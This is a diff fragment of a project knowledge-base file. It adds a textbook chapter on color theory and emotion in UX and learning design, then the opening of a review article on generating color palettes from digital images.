+only generate dark browns and grays). Table 1 provides some notation examples of common colors.
+## Table 1
+Notation Examples of Common Colors
+Name AdditiveSubtractive
+## 105
+
+RGBHexadecimalCMYK
+White rgb(255,255,255)#ffffffcmyk(0,0,0,0)
+Black rgb(0,0,0)#000000cmyk(0,0,0,100)
+Red rgb(255,0,0)#ff0000cmyk(0,100,100,0)
+Green rgb(0,255,0)#00ff00cmyk(100,0,100,0)
+Blue rgb(0,0,255)#0000ffcmyk(100,100,0,0)
+Yellow rgb(255,255,0)#ffff00cmyk(0,0,100,0)
+Cyan rgb(0,255,255)#00ffffcmyk(100,0,0,0)
+Magenta rgb(255,0,255)#ff00ffcmyk(0,100,0,0)
+Gray rgb(127,127,127)#808080cmyk(0,0,0,60)
+Using any of these notations can generate millions of possible colors, including basic hues of the color wheel, low-
+saturation tints of hues (by lightening toward white), and low-brightness shades of hues (by darkening toward black),
+along with various mixtures of tinting and shading (cf. Figure 2). These terms will be important moving forward for
+understanding research on color effects for the affective domain. Thus, hue represents the color’s position around the
+color wheel, saturation represents the amount of white mixed with the hue, and brightness represents the amount of
+black mixed with the hue.
+## 106
+
+## Figure 2
+Hue, Saturation, and Brightness on a Color Wheel
+- Emotion and Learning
+When people see the colors represented by the color wheel, they have various emotional and physiological reactions to
+them that influence their general experiences and also their learning. Alongside the famous cognitive domain taxonomy,
+Krathwohl, Bloom, and Masia (1964) also proposed a taxonomy for what they called the affective domain of learning, or
+the aspects of learning related to “a feeling of tone, an emotion, or a degree of acceptance or rejection” as expressed
+through goals oriented toward “interests, attitudes, appreciations, values, and emotional sets or biases” (p. 7). Recent
+years have seen renewed interest in the affective domain as educators and designers have struggled anew with how to
+support learner self-regulation, motivation, and persistence. Though the connection between color and learning may not
+be obvious at first, by influencing learner emotion, attitude, and interest, color can influence learner behaviors and
+attitudes, which in turn will influence their learning.
+For instance, one study found that exposure to red prior to taking an IQ test subconsciously impaired performance,
+presumably by triggering feelings of danger, failure, or avoidance (Elliot et al., 2007). Though such emotional states
+might have limited direct effects on learning outcomes, they may play an important role in improving intrinsic
+motivation and the desire to keep working (Heidig et al., 2015); by employing positive emotion cueing, designers can
+help increase mental effort in the learner, reduce perceived difficulty of the material (Park et al., 2014; Um et al., 2012),
+and improve learner comprehension (Plass et al., 2014).
+Psychological research on the emotional effects of color extends at least back to the 1950s. In their early work, Guilford
+and Smith (1959) found that, among the spectral colors, people preferred blue and green the most and orange and
+yellow the least. Subsequent research found that preference for blue, green, and white generally persisted across
+## 107
+
+countries and cultures (Adams & Osgood, 1973). Additionally, some emotional reactions are universal, such as anger,
+fear, and jealousy being connected to red and black, while other colors, like purple, are more culturally mediated (Hupka
+et al., 1997) or are influenced by gender (Osgood, 1971). For example, women take slightly more pleasure in bright
+colors and find highly-saturated colors slightly more psychologically arousing (Valdez & Mehrabian, 1994). Furthermore,
+even within a single culture, emotional reactions may change somewhat with age, such as childhood feelings of
+surprise and fear toward green maturing into adult feelings of happiness (e.g., Terwogt & Hoeksma, 1995).
+Physiologically, studies have shown that human reactions to color vary by hue, with long-wavelength colors (e.g., reds
+and yellows) being more arousing (e.g., increased heart rate and respiration) than short-wavelength colors (e.g., blues
+and greens; Jacobs & Hustmyer, 1974; Wilson, 1966). Additionally, many studies have found that primary hues are
+preferred to secondary or tertiary hues (Kaya & Epps, 2004) and that all of these are preferred to grays. Some of these
+reactions can be explained by differences in intensity of photoreceptor stimulation in the eye (e.g., the eye is more
+sensitive to red), while others likely stem from common environmental experiences, such as associating white with
+cleanliness and blacks and grays with dirtiness (Valdez & Mehrabian, 1994).
+## Figure 3
+Four Interface Examples That Cue Differing Behaviors, Trust Levels, Attitudes, etc.
+For a simple example of how this relates to UX and LX design, consider the password prompt interfaces in Figure 3. If
+you were presented with each of these interfaces, how might your emotional and behavioral reaction to the prompt
+differ based upon its color? Seeing a red prompt might make you stop and consider “Is this really a secure site?” On the
+other hand, an orange prompt might get your attention but be somewhat confusing or concerning, a gray prompt might
+feel bland but also seem secure or professional, and a blue prompt might make you feel comfortable about entering
+your information when perhaps you should not be comfortable.
+## 108
+
+## Figure 4
+Four Display Options for a Mobile App About Pet Care With Variations on Color and Content
+Similarly, suppose you are designing a learning app for young children on how to responsibly care for pets. In Figure 4,
+four options are provided. Two use an aggressive image of an adult dog (1, 2), while the other two use an image of a
+soft puppy (3, 4). Two also use a blood red background (1, 3), while the other two use a neutral grey (2, 4). What might
+be student affective reactions to each of these and how might it impact their ability to achieve learning objectives
+related to being a responsible pet owner? Option (1) feels very aggressive both because of the content and the color,
+while option (3) feels like there is a mismatch between what is shown and how it is presented, thereby evoking
+conflicting emotions. The neutral grey background for (2) and (4), however, allows the content to convey the emotion.
+And so, if our objective is for children to have a positive attitude toward pet care, then option (4) would likely be the best.
+## 109
+
+## Figure 5
+Brightness and Saturation Levels of the Primary Blue Hue With Four Examples
+Hue is not the only aspect of color that influences emotion; a color’s saturation (how little white is mixed in with it) and
+a color’s brightness (how little black is mixed in with it) also has an effect. In research studying color effects on the
+Pleasure-Arousal-Dominance emotion model (Mehrabian & Russell, 1974), brightness was found to positively impact
+pleasure and negatively impact arousal and dominance, while saturation positively impacts all three (Valdez &
+Mehrabian, 1994). So, if using a blue hue, as in Figure 5, you might choose from a variety of brightness and saturation
+levels, including (a) light blue (high brightness, low saturation), (b) azure (high brightness, high saturation), (c) blueish
+gray (low brightness, low saturation), or (d) indigo (low brightness, high saturation). Though each of these is a variant of
+blue, they all elicit different emotional responses in the viewer. For instance, (a) would be fairly pleasurable but not
+arousing or dominant, eliciting a feeling of tranquility; (b) would be the most pleasurable and somewhat arousing but
+not dominant, eliciting a feeling of amazement or awe; (c) would be the least pleasurable and fairly neutral for arousal
+and dominance, eliciting a feeling of boredom; and (d) would be the most arousing and dominant but neutral-positive
+for pleasure, eliciting more of a feeling of boldness or antagonism (Valdez & Mehrabian, 1994). In fact, brightness and
+saturation account for two-thirds to three-fourths of the detected variance in users’ feelings toward color (Valdez &
+Mehrabian, 1994). This means that shifting from soft pink to blood red in a design would likely impact users’ feelings
+more than shifting from soft pink to soft green or blue.
+## 110
+
+## Figure 6
+Four Variations of the Same Design That Elicit Different Affective Responses
+In addition, the context of color-use is important, as in the case of otherwise pleasant colors being used in inappropriate
+or unnatural ways (Valdez & Mehrabian, 1994). Consider the four variations of the same website design in Figure 6.
+Which of the four color variations is your favorite? For most people, (1) would likely be the preferred variation, because
+not only are the colors pleasant but the color-use more appropriately aligns with prior positive experience. In the other
+examples, the skin color of the hand looks a bit green, which may subconsciously suggest experiences of bodily
+disease or death to the user; similarly, the stems of the tulips in (4) are red rather than the expected green, which signals
+to the user that the experience is artificial or unnatural. In such ways, whether intentionally or unintentionally, our
+designs evoke affective responses; just as (1) might evoke memories of beautiful blue spring days with new life, the
+others might conversely evoke experiences of sadness, frustration, confusion, or discomfort, all of which will influence a
+user’s motivation and persistence with using the product.
+## 4. Guiding Considerations
+All of this research into the science of color-use is valuable, but how each of us then translates these findings into the
+actual, embedded craft of UX and LX design is a different matter. For this reason, a few considerations may be useful
+for guiding any color-use in UX and LX projects, including attending to contrast, attention, meaning, and harmony.
+## 4.1. Contrast
+First, ensuring high contrast is important in all designs for aesthetics but is especially important in those that use text. It
+is also a legal requirement for many UX projects to meet minimum accessibility expectations in many countries, such
+as those stipulated in the W3C’s Web Content Accessibility Guidelines (WCAG) 2.0. Contrast problems are widespread
+in learning products. In fact, a recent study on K-12 school website accessibility across the U.S. found that contrast
+errors were the most common type of error among all sites (Kimmons & Smith, 2019). Contrast errors arise because,
+though two similarly-saturated colors, such as crimson and blue, may look quite different to most viewers, when
+superimposed (as in Figure 7) they can become difficult to decipher from one another. As a simple check of this,
+## 111
+
+colored designs can be converted to grayscale to allow you to quickly see how similar the colors are to one another, or
+an automated contrast checker like the one provided by WebAIM can be helpful. To solve contrast problems, white and
+extremely light tints should be used to contrast highly-saturated colors, and black and dark grays should be used to
+contrast light tints.
+## Figure 7
+Low-Contrast and High-Contrast Examples of Analogous Color-use With Grayscale Conversions
+## 4.2. Attention
+Second, colors can be used to quickly and efficiently draw the attention of the eye to visual elements that matter. For
+instance, one eye-tracking study found that adding random colors to word labels on a grayscale figure moderately
+improved learner retention and transfer performance by improving the efficiency by which learners could differentiate
+textual elements (Ozcelik et al., 2009). On an app or VR interface, this might mean using a vibrant color only to
+effectively draw the learner’s attention to a few important elements, such as commonly-used buttons or interactive
+elements necessary for progression. Similar principles are often applied to print media, with color only being applied to
+text in the case of headings, key terms, or blockquote elements. Any variation in color will generally draw the eye of the
+learner to the variation, and this means that UX designers should use this principle to intentionally draw user attention
+to elements that matter and avoid unnecessary color variation in elements that are less important. It also means that
+color cues can effectively be used as guideposts for directing the learner through progressive elements and to influence
+user pathways in desired ways.
+## 4.3. Meaning
+Third, because color conveys emotional (and sometimes even conceptual) meaning to learners, colors should be used
+in a manner that synergistically emphasizes the intended meaning conveyed by the overall project and individual
+content elements. As with the pet care mobile app example in Figure 4, improperly using color can subvert intended
+meaning or set a tone that is either unhelpful, dissonant, or repulsive for learners. As mentioned early, actual meaning
+and affective influences of color can be complicated, contextual, and individual, but some influences are fairly universal,
+such as grays denoting lack of importance; warm colors evoking passion, dissent, or engagement; cool colors evoking
+comfort, closeness, or agreement; and so forth.
+## 112
+
+## 4.4. Harmony
+And fourth, to use colors well in any design effort, the designer must not only understand the emotions elicited by each
+color itself but also understand how to use colors together in harmonious ways that meet the intended purposes of the
+project. For instance, it is common knowledge that warm (low-wavelength) colors draw more attention than cool (high-
+wavelength) colors and that highly saturated colors draw more attention than washed-out tints, but the mark of a skilled
+designer is knowing both (a) which colors to use and (b) how to use varieties of colors together in harmonious and
+intentional ways.
+## Figure 8
+Two Websites Using the Same Colors but in Different Ways
+Even when two products use the exact same colors (as in Figure 8), how the colors are used in relation to one another
+will influence the learner’s affective experience. So, though both 8.1 and 8.2 use the same colors, 8.1 might feel cool,
+inviting, and professional, while 8.2 might feel comical, distracting, and amateurish.
+As a rule of thumb, many designers propose following what is called the 60-30-10 rule, which is commonly used in
+many other visual fields such as interior design. According to this rule, you should choose a primary color to dominate
+60% of the field of view, followed by a secondary color for 30%, and an accent or tertiary color for no more than 10%. For
+most UX products, this would mean choosing a subdued color as the primary color (such as the soft blue in Figure 6.1
+or the white in 8.1), a vibrant color as the accent color (such as the pink in Figure 6.1 or the “Google” primary colors in
+8.1), and some variation in between as the secondary color (such as the brown in Figure 6.1 or the grays in 8.1).
+## 5. Color Schemes
+To promote color harmony, and to implement the other guiding considerations mentioned above, most designers will
+begin color-use in a project by developing what is called a color scheme. In most cases, color schemes include between
+two and six colors that will be drawn upon in intentional ways. Common color scheme types include: (a)
+monochromatic, (b) analogous, (c) complementary, (d) complex, and (e) achromatic. Each type has its own strengths
+and weaknesses as well as design considerations to attend to, which I will now explain. For each type, an example
+image will also be provided, which has the five scheme colors depicted on the right of the image and the color wheel
+placements of each scheme depicted on the bottom-right.
+## 5.1. Monochromatic
+Monochromatic schemes (from mono meaning one and chroma meaning color) utilize a single, dominant color and
+provide color variation only by using desaturated versions (or tints) of the dominant color. Since they rely on a single
+color, monochromatic schemes are easy to use in complicated designs to provide a sense of cohesion and uniformity.
+Because the overall scheme is simple (i.e., one color), this also allows you to include richer secondary elements, such
+## 113
+
+as images in a Facebook news feed or a variety of images on a Pinterest board. The trade-off, however, is that
+monochromatic designs can be boring or overbearing if highly-saturated versions of the dominant color are overused.
+To prevent this, use plenty of white and very lightly-saturated tints of the dominant color to offset the more highly-
+saturated attention areas. In the provided example (Figure 9), the navigation bars are a highly-saturated blue, so the
+content on the rest of the design needs to use plenty of white and very light blues for balancing.
+## Figure 9
+Monochromatic Schemes Use a Single Dominant Color of Different Saturations
+## 5.2. Analogous
+Analogous schemes rely upon two or more nearby colors on the color wheel, generally spanning no more than one-third
+of the color wheel (e.g., red and blue, green and orange, cyan and violet). Since the colors are not distinct enough from
+one another to allow them to be placed side-by-side, plenty of white space should be used to separate instances of the
+two colors. Analogous schemes are more visually interesting than monochromatic schemes, because they provide
+more color variation, but they are also more difficult to use, because the two dominant colors must be well-separated,
+and any other visual elements should fit the scheme. In the provided example (Figure 10), the crimson logo and
+carousel are clearly separated from the blue events block, and the image in the carousel has a dominant blue color (via
+the woman’s sweater) that roughly matches the other blues in the design. If the woman’s sweater was orange or green,
+however, the design would struggle to be harmonious; because the design is already using so much color complexity,
+any more complexity introduced by the secondary elements would be distracting. Because their colors are so close to
+each other on the color wheel, analogous color schemes in particular may introduce contrast problems.
+## 114
+
+## Figure 10
+Analogous Schemes Use Two Dominant Colors Less Than One-Third of the Distance on the Color Wheel From One
+## Another
+## 5.3. Complementary
+The color wheel is conceived as circular rather than linear, because colors on opposite sides when (additively) mixed
+will make white. These are called complementary colors (cf. Figure 11). Complementary schemes, then, use two
+dominant colors that are on opposite sides of the color wheel, such as blue and gold, orange and cyan, or pink and
+green.
+## 115
+
+## Figure 11
+Complementary Colors Reside Opposite One Another on the Color Wheel
+Complementary schemes are also visually interesting, but the dominant colors are distinct enough from one another
+that they can be used in closer proximity than can analogous colors. In the provided example (Figure 12), the orange
+logo and thin horizontal bars are placed nicely beside or on top of the dark blues of the menu. However, though the two
+colors complement each other, one should be treated as the visually dominant color, and the other should be treated as
+the accent (in this case, the orange is the accent). Typically, the cooler color is used as the visually dominant color, and
+the warmer color is used as the accent. This allows for the design to show interesting variation while also using the
+accent color to draw the viewer’s attention to specific parts of the design, such as the logo, buttons, or content
+separators.
+## 116
+
+## Figure 12
+Complementary Schemes Use Two Dominant Colors on Opposite Sides of the Color Wheel From One Another
+## 5.4. Complex
+As the name suggests, complex schemes are the most complicated, because they use three or more dominant colors
+equally situated around the color wheel (e.g., blue, orange, red, and green). Because they use so much color variation,
+the visual space that the color takes up in the design should be very small and offset with plenty of white space. In the
+provided example (Figure 13), the website uses a large logo with four very different colors but offsets this by using little
+to no color in the rest of the design. Because of their variation, complex schemes can be very bright and interesting but
+can quickly become overpowering if the visual footprint of any of the colors becomes too pronounced (as in Figure 8.2).
+## 117
+
+## Figure 13
+Complex Schemes Use Three or More Colors Equally Situated Around the Color Wheel From One Another
+## 5.5. Achromatic
+Achromatic color schemes (meaning no color) use only variations on black, white, and gray. Of all the schemes, this
+scheme is the easiest to use but can also be the least interesting, because it provides the least color variation.
+Sometimes, however, less design complexity is desirable. In the provided example (Figure 14), the overall site design
+uses an achromatic scheme so that when colors are used in secondary elements they will draw the attention of the
+viewer (in this case, products that the vendor is seeking to sell are provided in full color, while menu items and logos are
+muted grays). Achromatic schemes may be helpful if secondary elements are complex and rich, but without these
+secondary elements, the design itself would be visually boring.
+## 118
+
+## Figure 14
+Achromatic Schemes Use Only Black, White, and Grays
+5.6. Choice and Use
+Various tools are available to designers that provide color scheme examples, such as the Adobe Color website or the
+Google Material Palette Generator, and there are many different ways to create a color scheme. For our purposes,
+however, I will offer two simple techniques to create professional-looking color schemes that anyone can follow.
+The first approach is to start with a single, dominant color that matches your overall emotional objective for your
+product—blues might be calming or sad, greens might be fresh or healthy, yellows might be fun or playful, reds might be
+outrageous or dangerous, etc. However, this decision might already have been made for you via institutional branding or
+logo decisions. Once you have this color, plug the color into a color scheming tool such as Adobe Color, and use the
+provided radio buttons to switch between color scheme types (e.g., analogous, monochromatic, complementary). If you
+want a simpler, safer design, go with a monochromatic type, and drag the circles on the color wheel to various
+saturation levels to give you sufficient variation in the five-color scheme. If you want something more interesting, try the
+complementary or analogous type. In the case of analogous, you can drag the circles around the color wheel to
+increase color variation, but the colors generally should not extend more than one-third (120-degrees) the
+circumference of the circle, lest the variation be too great. In the example image (Figure 15), I started with the Twitter
+logo blue (#00bbff) and found that an orange hue (#ff8400) might serve as a nice accent (complementary) color.
+## 119
+
+## Figure 15
+Choosing Different Color Scheme Types in Adobe Color From a Single Dominant Color
+The second approach is to choose a picture or painting that you enjoy (preferably of a natural setting) that you feel
+exemplifies the emotional state you want to create with your design. Then, upload the image to Adobe Color via the
+“Extract from an image” feature. This will attempt to identify the dominant colors in the picture and to situate them in
+relation to one another in a harmonious manner. Once imported, you can click back on the color wheel to see where the
+colors fall and to switch between color scheme types. In the provided example (Figure 16), the image of trees in autumn
+generated an analogous color scheme of oranges, yellows, greens, and burnt orange.
+## Figure 16
+Extracting a Color Scheme in Adobe Color From an Existing Image
+Once you have created a color scheme you are happy with, you can import the color scheme into other applications in a
+variety of ways. The simplest and most versatile method, however, is to simply take a screenshot and place it into your
+authoring tool or to manually transfer the hexadecimal codes.
+## 6. Conclusion
+This chapter has provided an overview of (a) the physics and technical notations for color, (b) scholarly literature on the
+relationships between color, emotion, and learning, (c) some guiding considerations on how to use color in UX design,
+and (d) concrete information on effectively using color schemes to improve harmony and contrast in designs. Some
+major takeaways for designers should include the following:
+## 120
+
+Choose dominant colors that will influence emotions aligning with your intended design goals.
+Use colors in ways that are intentional (e.g., accentuating important content) and natural or appropriate by drawing
+upon users’ prior experiences.
+Ensure that color contrast is sufficient and that color is used strategically to allow learners to clearly and readily
+identify important content and follow intended user pathways.
+Choose a color scheme that counterbalances the complexity of your content (complex content requires a simpler
+color scheme, while simpler content can use a more complex color scheme).
+Use whitespace and white, black, or gray text to increase contrast and to balance color-use.
+By following these suggestions, UX and LX designers can create designs that increase motivation and persistence by
+making user experiences more pleasing, more intentional, and less frustrating.
+From a research perspective, much work is still needed to help designers better understand issues of contextual color-
+use, differential affective influences on learners, and interactions between various colors as well as between color,
+content, and objectives. Because effective color-use in UX design is best described as craft (or synergy between
+science and art) and because learning contexts vary so greatly, it is reasonable that the most important research in this
+area moving forward will focus on applied, focused uses of color through iterative design cases and continual
+improvement. Though UX designers might not have the same obsession with color that Monet expressed, hopefully our
+obsession for learning will help us to more fully recognize that color is an important aspect of the learner’s experience
+that should be better understood and more skillfully applied.
+## References
+Adams, F. M., & Osgood, C. E. (1973). A cross-cultural study of the affective meanings of color. Journal of Cross-Cultural
+## Psychology, 4(2), 135–156.
+Elliot, A. J., Maier, M. A., Moller, A. C., Friedman, R., & Meinhardt, J. (2007). Color and psychological functioning: The
+effect of red on performance attainment. Journal of Experimental Psychology: General, 136(1), 154–168.
+Gaines, K. S., & Curry, Z. D. (2011). The inclusive classroom: The effects of color on learning and behavior. Journal of
+## Family & Consumer Sciences Education, 29(1), 46–57.
+Google. (n.d.). The color system. Material Design. https://edtechbooks.org/-Cqk
+Guilford, J. P., & Smith, P. C. (1959). A system of color preferences. American Journal of Psychology, 72, 487–502.
+Heidig, S., Müller, J., & Reichelt, M. (2015). Emotional design in multimedia learning: Differentiation on relevant design
+features and their effects on emotions and learning. Computers in Human Behavior, 44, 81–95.
+Hupka, R. B., Zaleski, Z., Otto, J., Reidl, L., & Tarabrina, N. V. (1997). The colors of anger, envy, fear, and jealousy: A cross-
+cultural study. Journal of Cross-Cultural Psychology, 28(2), 156–171.
+Jacobs, K. W., & Hustmyer, F. E. (1974). Effects of four psychological primary colors on GSR, heart rate, and respiration
+rate. Perceptual and Motor Skills, 38, 763–766.
+Kaya, N., & Epps, H. H. (2004). Relationship between color and emotion: A study of college students. College Student
+## Journal, 38(3), 396–405.
+Kimmons, R., & Smith, J. (2019). Accessibility in mind? A nationwide study of K-12 websites in the U.S. First Monday,
+24(2). https://edtechbooks.org/-pRn
+Krathwohl, D. R., Bloom, B. S., & Masia, B. (1964). A taxonomy of educational objectives — Handbook II: Affective
+domain. David McKay Company, Inc.
+## 121
+
+Mehrabian, A., & Russell, J. A. (1974). An approach to environmental psychology. MIT Press.
+Osgood, C. E. (1971). Exploration in semantic space: A personal diary 1. Journal of Social Issues, 27(4), 5–64.
+Park, B., Plass, J. L., & Brünken, R. (2014). Cognitive and affective processes in multimedia learning. Learning and
+## Instruction, 29, 125–127.
+Plass, J. L., Heidig, S., Hayward, E. O., Homer, B. D., & Um, E. (2014). Emotional design in multimedia learning: Effects of
+shape and color on affect and learning. Learning and Instruction, 29, 128–140.
+Terwogt, M. M., & Hoeksma, J. B. (1995). Colors and emotions: Preferences and combinations. The Journal of General
+## Psychology, 122(1), 5–17.
+Um, E., Plass, J. L., Hayward, E. O., & Homer, B. D. (2012). Emotional design in multimedia learning. Journal of
+## Educational Psychology, 104(2), 485–498.
+Valdez, P., & Mehrabian, A. (1994). Effects of color on emotions. Journal of Experimental Psychology: General, 123(4),
+## 394–409.
+Wilson, G. D. (1966). Arousal properties of red versus green. Perceptual and Motor Skills, 23, 942–949.
+## 122
+
+## Royce Kimmons
+## Brigham Young University
+Royce Kimmons is an Associate Professor of Instructional Psychology and Technology at Brigham Young
+University where he studies digital participation divides specifically in the realms of social media, open
+education, and classroom technology use. He is also the founder of EdTechBooks.org. More information about
+his work may be found at http://roycekimmons.com, and you may also dialogue with him on Twitter
+## @roycekimmons.
+This content is provided to you freely by EdTech Books.
+Access it online or download it at https://edtechbooks.org/ux/color_theory.
+## 123
+
+## 124
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]
 
 ### 📘 KNOWLEDGE: NEXUS_AGENTIC-FORMS.MD
 
@@ -13754,6 +25458,1472 @@ NEXUS AI adalah project dengan **ambisi arsitektur yang tinggi** dan beberapa im
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]
 
+### 📘 KNOWLEDGE: NEXUS_COLOR RESEARCH   APPLICATION - 2024 - GAO - COLOR PALETTE GENERATION FROM DIGITAL IMAGES  A REVIEW.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+## Color Research & Application, 2025; 50:250–265
+https://doi.org/10.1002/col.22975
+## 250
+## Color Research & Application
+## REVIEW
+## OPEN ACCESS
+## Color Palette Generation From Digital Images: A Review
+## Yafan Gao
+## 1
+## |  Jinxing Liang
+## 1,2
+## |  Jie Yang
+## 3
+## 1
+School of Computer Science and Artificial Intelligence, Wuhan Textile University, Wuhan, China |
+## 2
+School of Design, University of Leeds, Leeds,
+## UK  |
+## 3
+School of New Media, Beijing Institute of Graphic Communication, Beijing, China
+Correspondence: Jinxing Liang (jxliang@whu.edu.cn)    |   Jie Yang (j.yang@bigc.edu.cn)
+## Received: 3 April 2024 | Revised: 10 September 2024 | Accepted: 9 December 2024
+Funding: This work was supported by National Natural Science Foundation of China (62305255), Natural Science Foundation of Hubei Province (No.
+2022CFB537), Hubei Provincial Department of Education Science and Technology Research Program Youth Talent (No. Q20221706), and China Scholarship
+## Council (202308420128).
+Keywords: clustering | color difference | color palette | color space | neural network
+## ABSTR ACT
+Color palette is a critical component of art, design, and lots of applications, providing the basis for organizing and utilizing colors
+to achieve specific objectives. However, generating color palettes from digital images presents unique challenges due to the com-
+plexity of colors in images. This review comprehensively investigates various techniques for generating color palettes from digital
+images and provides a thorough classification and discussion of these techniques from multiple perspectives. A color space must
+be selected to generate a color palette, and a generation method must be employed. This paper offers a concise overview of color
+spaces, an introduction to current palette generation methods, and an analysis of the metrics used to evaluate color differences
+between palettes. The review encompasses traditional manual methods and computer- aided automation methods, further cate-
+gorized as histogram- based, clustering- based, and neural network- based methods. Discussion on the strengths, weaknesses, and
+applicability of existing methods are presented, and also opportunities for future research to enhance color palette generation
+from digital images are identified.
+## 1   |   Introduction
+Kandinsky's  report  provides  insight  into  the  value  of  colors  in
+design  [1].  It  identifies  two  types  of  values  that  colors  can  pro-
+vide: visual value, which pertains to physical effects, and asso-
+ciative value, which pertains to psychological effects. Research
+suggests that visual stimuli account for almost 80% of the human
+brain's  response  [2].  Market  research  conducted  by  the  China
+Popular Colors Association indicates that appropriate color de-
+sign  can  increase  a  product's  added  value  by  10%–25%  without
+any additional costs. A study on design aspects found that color
+is  the  most  frequently  mentioned  and  critical  factor  in  the  de-
+sign process [3]. It also revealed that 70% of designers find color
+selection  challenging.  These  studies  emphasize  the  important
+role of color in design decisions.
+Generally, the color palettes are first selected before the specific
+color  scheme  is  defined.  For  color  palette  selection,  it  is  tradi-
+tionally completed manually by referencing popular color charts
+such as the Pantone chart. When generating a color palette, an-
+other  key  consideration  is  determining  the  optimal  number  of
+colors. Studies show that palettes with 5–6 colors often strike a
+balance  between  complexity  and  usability.  A  5-  color  palette  is
+typically  used  in  simple,  balanced  designs  like  web  pages  and
+brand  logos  [4,  5].  Meanwhile,  a  6-  color  palette  is  more  suited
+to  scenarios  requiring  richer  visual  effects  or  layers,  such  as
+This is an open access article under the terms of the Creative Commons Attribution License, which permits use, distribution and reproduction in any medium, provided the original work is
+properly cited.
+© 2024 The Author(s). Color Research & Application published by Wiley Periodicals LLC.
+Abbreviations: BMU, best matching unit; CNN, convolutional neural networks; CYS, Chinese youth subculture; FCM, fuzzy C- means; GAN, generative adversarial network; HSI, hue-
+saturation- intensity; HSL, hue- saturation- lightness; HSV, hue- saturation- value; LLMs, large language models; LSTM, long short- term memory; MECDM, mean color- difference; MICDM,
+minimum color difference; MSQE, mean square quantization error; NRGB, normalized RGB; RGB, red, green, blue; RL, reinforcement learning; SOM, self- organizing maps; SRCNN,
+super- resolution convolutional neural network.
+
+## 251
+high-  end  fashion  design,  advertising,  or  film  color  grading
+[6,  7].  However,  the  number  of  colors  can  significantly  impact
+the  palette's  visual  harmony  and  practicality  across  different
+fields. In recent years, the data- driven- based methods for color
+palette  generation  from  color  images  have  been  paid  more  and
+more attention as they can directly and automatically construct
+color palettes from different types of color images. Color palette
+generation  from  images  involves  transforming  a  vast  array  of
+colors into a practical set, primarily by identifying dominant col-
+ors in images, which now is widely applied in image processing
+[8–11],  analysis  [12,  13],  computer  vision  [14],  and  more.  It  not
+only assists in different tasks like web and product design, film
+color  grading,  image  classification,  and  compression  but  also
+helps to balance the image quality with efficiency in storage and
+transmission.
+When generating a color palette from images, two main issues
+need  to  be  resolved.  First,  which  color  space  should  be  chosen
+for  color  data  expression,  and  second,  what  kind  of  strategy
+should be used to generate a color palette from images? A color
+space is a way that is used to specify, create, and visualize col-
+ors. Different color spaces that are used for color segmentation
+include  RGB,  HSI,  CMY,  CMYK,  YIQ,  CIEXYZ,  CIEL*a*b*,
+and  others.  However,  no  single  color  space  can  express  all  col-
+ors  in  nature  scene,  and  each  color  space  has  its  advantages
+and  disadvantages  [15].  The  mostly  used  RGB  color  space  is
+device-  dependent,  while  the  CIEL*a*b*  color  space  is  visually
+perception-  based,  where  “L”  represents  lightness,  and  “a”  and
+“b” represents color component [16].
+Based on the selected color space, different methods can be used
+to generate a color palette from images, such as the traditional
+manually-  based  method  and  the  current  hot  computer-  aided
+methods.  During  the  investigation  of  the  current  color  palette
+generation  methods,  we  not  only  focused  on  the  algorithms
+but also investigated their application in different fields. At the
+same  time,  the  complexity  of  color  selection  in  design,  innova-
+tive image recoloring, and the significance of interior design and
+molecular visualization are also presented. Through a compre-
+hensive  investigation  and  analysis  of  palette  generation  algo-
+rithms and their applications in related fields, the development
+trends and future directions of palette generation technology are
+discussed,  and  the  importance  of  combining  color  psychology,
+culture,  and  technology  factors  in  palette  generation  is  ana-
+lyzed. This will help us step into the dynamic interplay of color,
+technology, and human perception, and also offer us a valuable
+resource for understanding color palette generation in the digi-
+tal era.
+This review provides us with an overview of the most widely
+used  algorithms  for  color  palette  generation,  as  well  as  a
+detailed  analysis  of  their  pros  and  cons.  Organized  into  six
+sections,  the  article  covers  a  range  of  topics,  starting  with
+an  introduction  to  the  subject  in  Section 1.  In  Section 2,  we
+explore  the  various  color  spaces  and  their  characteristics.
+Section 3 delves into the concept of color difference between
+palettes,  while  Section 4  provides  a  detailed  account  of  the
+current  methods  available  for  generating  palettes,  including
+both  traditional  manual  techniques  and  computer-  aided  au-
+tomation  methods.  Specifically,  we  classify  computer-  aided
+methods into three types: histogram- based, clustering- based,
+and neural network- based. In Section 5, we discuss the differ-
+ent  applications  of  color  palettes  and  their  classifications  in
+the era of large models. Finally, in Section 6, we propose some
+thought- provoking research topics and provide a summary of
+the rev iew.
+## 2   |   Color Spaces
+Color  is  a  fundamental  component  of  visual  perception  and
+plays  a  crucial  role  in  distinguishing  and  recognizing  infor-
+mation.  Physically,  color  is  generated  through  the  reflection
+of  specific  wavelengths  of  light  from  objects.  It  is  essentially
+a  spectrum  of  electromagnetic  waves  within  a  specific  fre-
+quency  range.  The  longest  wavelengths  correspond  to  the
+color  red,  while  the  shortest  wavelengths  correspond  to  the
+color  blue-  violet  (Figure 1).  To  describe  the  color  objectively,
+we  need  mathematical  models  to  map  the  spectral  radiance
+to  the  color  perception  of  the  human  visual  system,  which
+encompasses  a  wide  range  of  hues  in  the  visible  spectrum  of
+light. Therefore, a set of equations and/or rules will be defined
+to  construct  the  model  to  express  color,  and  a  color  space  is
+certainly developed to interpret the color attributes of the data
+in  the  model  [17].  A  short  review  of  color  space  from  several
+aspects is as follows.
+## 2.1   |   Device- Dependent Color Spaces
+Device-  dependent  color  spaces  are  mainly  divided  into  addi-
+tive  color  spaces  and  perceptual  color  spaces.  Additive  color
+spaces, like RGB [18], are created by mixing primary colors and
+are widely used in displays and computer graphics due to their
+simplicity, intuitive nature, and broad hardware and software
+support. However, the non- linearity and sensitivity of RGB to
+lighting  variations  complicate  hue  tracking  and  color  analy-
+sis,  making  it  challenging  in  certain  applications.  The  nor-
+malized  RGB  (NRGB)  color  space  improves  color  perception
+under  varying  lighting  conditions  by  utilizing  proportional
+amounts  of  the  three  primary  colors,  ensuring  that  the  sum
+of  proportions  for  all  colors  is  always  100%  (Equations 1–3).
+Additionally,  it  allows  any  color  to  be  described  using  only
+two  primary  colors,  with  the  third  derived  as  the  difference
+between  1  and  the  sum  of  the  other  two.  While  this  reduces
+the  impact  of  lighting  variations,  it  diminishes  object  detec-
+tion  capabilities  due  to  the  loss  of  contrast  provided  by  the
+same illumination [19].
